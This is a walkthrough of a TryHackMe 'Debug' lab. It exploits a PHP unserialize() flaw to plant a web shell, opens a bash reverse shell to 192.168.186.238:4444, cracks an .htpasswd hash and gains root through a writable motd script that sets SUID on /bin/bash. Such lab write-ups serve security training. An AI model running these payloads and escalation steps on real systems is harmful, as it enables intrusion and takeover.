---
tags:
  - THM
  - Linux
  - Medium
  - Leakage
  - Deserialization
  - RCE
---
https://tryhackme.com/room/debug/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.65.166.28 debug.thm
```
# Scanning
```console
$ nmap -p22,80 -sV -sC debug.thm

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 44:ee:1e:ba:07:2a:54:69:ff:11:e3:49:d7:db:a9:01 (RSA)
|   256 8b:2a:8f:d8:40:95:33:d5:fa:7a:40:6a:7f:29:e4:03 (ECDSA)
|_  256 65:59:e4:40:2a:c2:d7:05:77:b3:af:60:da:cd:fc:67 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration
The website is a default Apache page.

Found `/backup/` directory by doing fuzzing. So download everything:
```console
$ wget -r -np http://debug.thm/backup/

$ cd debug.thm/backup/
```
Found interesting source code inside `index.php.bak` file:
```php
<?php

class FormSubmit {

public $form_file = 'message.txt';
public $message = '';

public function SaveMessage() {

$NameArea = $_GET['name']; 
$EmailArea = $_GET['email'];
$TextArea = $_GET['comments'];

    $this-> message = "Message From : " . $NameArea . " || From Email : " . $EmailArea . " || Comment : " . $TextArea . "\n";

}

public function __destruct() {

file_put_contents(__DIR__ . '/' . $this->form_file,$this->message,FILE_APPEND);
echo 'Your submission has been successfully saved!';

}

}

// Leaving this for now... only for debug purposes... do not touch!

$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);

$application = new FormSubmit;
$application -> SaveMessage();


?>
```
# Exploitation
Create `exploit.php` script to create malicious serialized object:
```php
<?php

class FormSubmit {
    public $form_file = 'rev.php';
    public $message = '<?php shell_exec($_GET["cmd"]); ?>';
}

$obj = new FormSubmit();
echo urlencode(serialize($obj));

?>
```
Wait for connections:
```console
$ nc -lvnp 4444
```
Create the reverse shell file and trigger it:
```console
$ curl -s "http://debug.thm/index.php?debug=$(php exploit.php)"

$ cmd=$(echo -n '/bin/bash -c "bash -i >& /dev/tcp/192.168.186.238/4444 0>&1"' | urlencode -a)

$ curl -s "http://debug.thm/rev.php?cmd=$cmd"
```
# Post-Exploitation
## User Migration
Found **james' password**:
```console
$ cat /var/www/html/.htpasswd

james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1
```
Using `john`, found that the **password** is `jamaica`. Then, become **james**:
```console
$ su james
Password:

$ whoami
james
```
Get the **user flag**:
```console
$ cat /home/james/user.txt
```
## Privilege Escalation
Found a note for **james**:
```console
$ cat /home/james/Note-To-James.txt

Dear James,

As you may already know, we are soon planning to submit this machine to THM's CyberSecurity Platform! Crazy... Isn't it? 

But there's still one thing I'd like you to do, before the submission.

Could you please make our ssh welcome message a bit more pretty... you know... something beautiful :D

I gave you access to modify all these files :) 

Oh and one last thing... You gotta hurry up! We don't have much time left until the submission!

Best Regards,

root
```
Find the writable configuration files:
```console
$ find /etc -writable 2>/dev/null

/etc/update-motd.d/10-help-text
/etc/update-motd.d/91-release-upgrade
/etc/update-motd.d/98-fsck-at-reboot
/etc/update-motd.d/98-reboot-required
/etc/update-motd.d/00-header
/etc/update-motd.d/00-header.save
/etc/update-motd.d/99-esm
/etc/update-motd.d/90-updates-available
```
Add the next line to `/etc/update-motd.d/00-header`:
```bash
chmod u+s /bin/bash
```
Re-connect as **james** via SSH and become **root**:
```console
$ ssh james@debug.thm

$ /bin/bash -p
```
Get the **root flag**:
```console
$ cat /root/root.txt
```